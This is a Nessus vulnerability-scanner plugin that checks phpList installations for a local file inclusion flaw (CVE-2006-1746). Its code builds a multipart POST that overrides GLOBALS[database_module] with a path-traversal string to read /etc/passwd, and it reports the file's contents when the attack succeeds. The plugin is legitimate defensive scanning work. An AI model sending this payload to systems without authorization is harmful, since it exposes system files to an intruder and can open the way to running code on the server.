#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21222);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2006-1746");
  script_bugtraq_id(17429);
  script_osvdb_id(24637);

  script_name(english:"phpList index.php database_module Parameter Local File Inclusion");
  script_summary(english:"Tries to read /etc/passwd using phpList");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a local
file include attack.");
  script_set_attribute(attribute:"description", value:
"The version of phpList installed on the remote host fails to sanitize
user-supplied input to the 'database_module' parameter of the
'lists/index.php' script before using it in a PHP 'require_once'
function.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to permissions of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/430475/30/30/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/430597");
  script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_202005.79.html");
   # http://web.archive.org/web/20070709115410/http://tincan.co.uk/?lid=851
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?76abc433");
  script_set_attribute(attribute:"solution", value:
"Either edit the config file as described in the reference above or
upgrade to PHP version 4.4.1 / 5.0.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/04/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/04/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tincan:phplist");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("phplist_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phplist");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_kb_item(string("www/", port, "/phplist"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure one of the affected scripts exists.
  r = http_send_recv3(method:"GET", item:string(dir, "/lists/index.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("class=webblermenu>PHPlist" >< res)
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd";
    bound = "bound";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS[developer_email]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "developer_email=", SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS[database_module]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "../../../../../../../../../../", file, "\r\n",

      boundary, "--", "\r\n"
    );
    r = http_send_recv3(method:"POST", item: dir+"/lists/index.php", port: port,
      content_type: "multipart/form-data; boundary="+bound,
      data: postdata);

    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\([^)]+/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\([^)]+/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:")) 
        contents = res - strstr(res, "<br />");

      if (isnull(contents)) report = NULL;
      else
        report = string(
          "Here are the contents of the file '/etc/passwd' that\n",
          "Nessus was able to read from the remote host :\n",
          "\n",
          contents
        );

      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
